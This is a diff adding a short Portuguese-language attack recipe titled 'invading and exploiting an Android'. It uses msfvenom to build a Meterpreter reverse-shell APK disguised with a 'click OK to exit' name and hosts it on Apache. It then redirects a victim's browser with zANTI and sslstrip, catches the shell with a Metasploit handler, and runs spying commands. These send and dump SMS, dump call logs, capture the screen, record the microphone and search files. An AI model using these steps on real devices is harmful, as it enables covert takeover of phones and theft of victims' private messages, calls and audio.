@@ -1,0 +1,83 @@
+Invadindo e Explorando um android
+
+
+cd Desktop
+msfvenom -p android/meterpreter/reverse_tcp LHOST=meuip
+LPORT=porta R > CLICK-OK-PARA-SAIR.apk
+assinar apk
+cd /var/www/html
+rm *
+seta pra cima 2x
+esquerda end
+sbt cd por mv CLICK... /var/www/html/
+chmod 777 CLICK...
+service apache2 restart
+
+monitorar navegador da vitima com zanti
+para saber se aceita sslstrip
+
+se sim
+
+ZANTI redirect to meu ip do apache2
+
+sslstrip de outra maquina para alvo da rede
+
+msfconsole
+
+use exploit/multi/handler
+
+set PAYLOAD android/meterpreter/reverse_tcp
+set LHOST meuip
+set LPORT porta
+exploit (-j -z)
+
+cd /
+cd ..
+cd /storage/sdcard0/
+ls
+cd 
+
+meterpreter > send_sms -d "2674554859" -t "hello"
+
+
+meterpreter > dump_sms
+
+[*] Fetching 4 sms messages
+
+[*] SMS messages saved to: sms_dump_20160308163212.txt
+
+
+run post/android/capture/screen
+
+
+
+search -d . -f *.txt
+
+
+ifconfig
+
+
+
+record_mic -d 20
+
+
+activity_start
+
+
+check_root
+
+
+dump_calllog
+
+
+
+cat sms_dump_20160308163212.txt
+
+
+
+
+
+
+https://treinolinuxblog.wordpress.com/2017/12/26/expansao-de-parametros-no-bash/
+
+comandos linux expert treinos
